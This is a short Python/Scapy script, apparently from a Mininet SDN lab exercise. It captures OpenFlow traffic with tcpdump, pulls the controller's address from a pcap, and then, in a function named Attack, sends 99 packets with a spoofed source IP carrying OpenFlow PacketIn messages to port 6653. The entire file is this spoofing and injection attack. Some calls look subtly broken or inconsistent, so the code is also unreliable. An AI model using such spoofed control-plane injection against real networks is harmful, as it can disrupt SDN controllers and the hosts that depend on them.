from lib2to3.pgen2.token import AT
from scapy.all import *
from scapy.contrib.openflow import OpenFlow
#from scapy.layer.l2 import Ether
import os

def Packet_capture():
    user_input = os.system("sudo tcpdump -i eth0 port 6653 -c40 -w objective_5.pcap")

def User_Input():
    packet_list= rdpcap("/home/mininet/sunny.pcap")
    controller_ip = packet_list[2]['IP'].src
    controller_port = packet_list[2]['TCP'].sport
    print(controller_ip, controller_port)
   # d = Ether()/IP(dst="192.168.215.8", src="192.168.215.7")/TCP(sport=9999, dport=6653, seq=1)/openflow.OFPTPacketIn()
   # sendp(d)

def Attack():
    for i in range(1, 100):
        attack = sendp(IP(dst="192.168.215.8", src="192.168.215.7")/TCP(sport=9999, dport=6653, seq=i)/OpenFlow.OFPTPacketIn)
        print(attack)

if __name__ == "__main__":
    Packet_capture()
    User_Input()
    Attack()
